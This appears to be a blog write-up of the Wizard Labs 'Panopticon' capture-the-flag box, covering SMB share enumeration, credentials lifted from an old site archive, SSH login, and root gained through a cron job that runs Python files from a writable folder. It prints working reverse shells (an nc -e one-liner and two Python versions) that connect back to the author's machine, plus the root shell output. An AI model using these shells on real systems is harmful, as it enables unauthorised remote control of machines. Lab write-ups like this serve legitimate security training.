---
layout: post
title: Wizard Labs - Panopticon
date: 2019-04-16 08:32
author: rowbot
comments: true
categories: [Wizard Labs]
---
<!-- wp:image {"id":637,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image.png" alt="" class="wp-image-637"/><figcaption> <br><a href="https://labs.wizard-security.net/">https://labs.wizard-security.net</a> </figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> I found getting the user on this box very easy, I think it took me &lt; 10 minutes. Then after about another 10 minutes I roughly knew what I had to do to get root but for the guts of 3 hours couldn't figure out why I wasn't getting the cron job to execute my script! I figured it out in the end, I just had to take a step back and re-read the /var/mail/seer log. </p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Ran the following nmap scan: nmap -sC -sV -oA all -vv -p- 10.1.1.34. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":640,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-2.png" alt="" class="wp-image-640"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>What stood out to me was port 80, maybe some interesting directories or a web app attack could be carried out. Port 139 and 445 was SAMBA- always interesting to see what I can access through open shares or vulnerable versions.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Port 80 revealed a website. I didn't poke about the website as it looked quite flat, the only entry point was the contact form - that I could see. I was keen to move on to what I could see from the SAMBA share.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":643,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-3.png" alt="" class="wp-image-643"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I ran smbmap to enumerate the SAMBA share and discover the Public share can be read. <a href="https://guide.offsecnewbie.com/network-pen#smbmap">https://guide.offsecnewbie.com/network-pen#smbmap</a></p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -H $ip
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.1.1.34...
[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
	Disk                                                  	Permissions
	----                                                  	-----------
	public                                            	READ ONLY
	IPC$                                              	NO ACCESS
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I discovered a zip file called old-site.zip.</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -R Public -H $ip <font color="#555753"><b>#Recursively list dirs, and files</b></font>
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.1.1.34...
[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
	Disk                                                  	Permissions
	----                                                  	-----------
	Public                                            	READ ONLY
	.\
	dr--r--r--                0 Sun Jun 17 16:17:11 2018	.
	dr--r--r--                0 Sat Feb 24 19:27:52 2018	..
	-r--r--r--           427943 Sat Feb 24 19:57:46 2018	old-site.zip
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I downloaded it. As you can see smbmap is a nice little tool. I prefer it to enum4linux - though enum4linux does a few different things.</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -R Public -H $ip -A old-site.zip -q <font color="#555753"><b>#downloads a file in quiet mode</b></font>
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.1.1.34...
[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
	Disk                                                  	Permissions
	----                                                  	-----------
	[+] Match found! Downloading: Public\.\old-site.zip
	Public                                            	READ ONLY
	[+] Starting search for files matching 'old-site.zip' on share Public.
	[+] Match found! Downloading: Public\old-site.zip
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I knew that I there would be a config file which I could get a password or user from. So I unzipped the file.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":661} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-4.png" alt="" class="wp-image-661"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":662} -->
<figure class="wp-block-image"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-5.png" alt="" class="wp-image-662"/><figcaption>username and password captured.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I remembered that there was an ssh port open and tried to login with those creds.</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">ssh</font> seer@$ip                                                              
seer@10.1.1.34&apos;s password: 
Linux Panopticon 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
<mark>You have new mail.</mark>
Last login: Sun Dec  2 09:18:32 2018 from 10.253.1.0
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ cat /home/seer/user.txt 
6d3934480b23c0ca3d164cf19fa11946
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ 
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I noticed when I logged in that I received a message that I had new mail. I highlighted it above.<br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I knew that mail for the user is located in /var/mail/seer in this instance.  <br>What does it contain, and who/what sent it? Most often the messages contain output of cron jobs, or a system security report by logwatch, or similar things. Time to read it!</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":668,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-6.png" alt="" class="wp-image-668"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The mail file was very big </p>
<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ ls -la /var/mail/seer 
-rw-rw---- 1 seer mail 23172905 Dec  2 11:36 /var/mail/seer
</pre>
<!-- /wp:paragraph -->

<!-- wp:image {"id":671,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-7.png" alt="" class="wp-image-671"/><figcaption>I'm terrible at reading file sizes and working them out to something I can understand so I turn to Google</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I scrolled through and seen reference to a hidden bash script called .lol.sh</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Subject: Cron &lt;root@Panopticon&gt; bash /var/tmp/.lol.sh
</pre>
<!-- /wp:preformatted -->

<!-- wp:html -->
<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ ls -la /var/tmp/.lol.sh 
-rwx------ 1 root root 125 Jun 27 14:38 <font color="#8AE234"><b>/var/tmp/.lol.sh</b></font>
You have new mail in /var/mail/seer
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>In Seer's home directory there was a folder called dev_departement (spelled incorrectly). Maybe the machine's author is French?</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":673,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-8.png" alt="" class="wp-image-673"/></figure></div>
<!-- /wp:image -->

<!-- wp:html -->
The bad spelling and grammar continues when I looked at dev.txt :)
<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ cat dev.txt 
Hello Seer !! You are the only script developper in this departement ... Like I said you , please drop here all your scripts maybe they can make my life easier :)

Brenda&amp;
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ 
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>So to summarize what I've found. There looks to be a cronjob running which runs a hidden file called .lol.sh of which I am not able to read. There is a file telling me that any scripts I drop into the /home/seer/dev_departement folder will be run. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This was where I was stuck for a few hours as I looked through the mail file and found a lot of references to a hidden file called .update.sh</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh <br><br>From: root@panopticon.panopticon (Cron Daemon) To: root@panopticon.panopticon Subject: Cron &lt;root@Panopticon> /home/seer/update.sh MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit X-Cron-Env: &lt;SHELL=/bin/sh> X-Cron-Env: &lt;HOME=/root> X-Cron-Env: &lt;PATH=/usr/bin:/bin> X-Cron-Env: &lt;LOGNAME=root> Message-Id: &lt;E1epgcw-0000CA-BA@Panopticon.Panopticon> Date: Sat, 24 Feb 2018 21:41:02 +0100 </pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I thought that 1) the script had to be hidden and called update.sh and 2) that the script had to be a bash file while also being saved in seer's home directory rather than the dev one.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After creating a .sh file with </p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"> nc -e /bin/sh 10.253.0.255 443 </pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>inside and starting a listener at my end, nothing was coming back. The script was not being run. I went back and forth moving the file to different locations, using  different ports, getting the script to wget from my webserver to see if it was running it at all -  nothing! Even confirming that the script was executable.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I reviewed the mail file again and seen this beauty - highlighted below</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>From: root@panopticon.panopticon (Cron Daemon)
To: root@panopticon.panopticon
Subject: Cron &lt;root@Panopticon&gt; <mark> for f in /home/seer/dev_departement/*.py ; do  /usr/bin/python3 &quot;$f&quot; done </mark>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: &lt;SHELL=/bin/sh&gt;
X-Cron-Env: &lt;HOME=/root&gt;
X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
X-Cron-Env: &lt;LOGNAME=root&gt;
Message-Id: &lt;E1fY9gM-0000EM-02@Panopticon.Panopticon&gt;
Date: Wed, 27 Jun 2018 14:36:22 +0200
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>The script had to be a python script.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I tried using the following script but it didnt work, probably because it needed to be python3</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ cat script.py 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.253.0.255",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ 
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I created a different python script</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><font color="#34E2E2"><b>import</b></font> socket
<font color="#34E2E2"><b>import</b></font> subprocess
s=socket.socket()
s.connect((<font color="#8AE234"><b>"10.253.0.255"</b></font>,443))
<font color="#34E2E2"><b>while</b></font> True:
     proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     s.send(proc.stdout.read() + proc.stderr.read())
</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ ls -la
total 16
drwxrwxrwx 2 root root 4096 Dec  2 13:14 <span style="background-color:#4E9A06"><font color="#3465A4">.</font></span>
drwxr-xr-x 7 seer seer 4096 Jun 27 14:17 <font color="#729FCF"><b>..</b></font>
-rw-r--r-- 1 root root  172 Jun 17 17:34 dev.txt
-rwxr-xr-x 1 seer seer  273 Dec  2 13:02 <font color="#8AE234"><b>script.py</b></font>
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Started a listener on my machine and got a connection back.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"> ⚡  ~/Desktop/panopticon  nc -lnvp 443  
listening on [any] 443 ...
connect to [10.253.0.255] from (UNKNOWN) [10.1.1.34] 33634
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
8b470f864495744fcd8c3dc7b370e889
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I wanted to see what was in the .lol.sh </p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cat /var/tmp/.lol.sh
cd /home/seer/dev_departement 
for f in *.py; do  # or wget-*.sh instead of *.sh
  python3 "$f"   || break # if needed 
done
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>And there's the code that ran the python script in.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>So this was a nice easy box to start with and I'm looking forward to exploring the other boxes that wizard labs have.</p>
<!-- /wp:paragraph -->
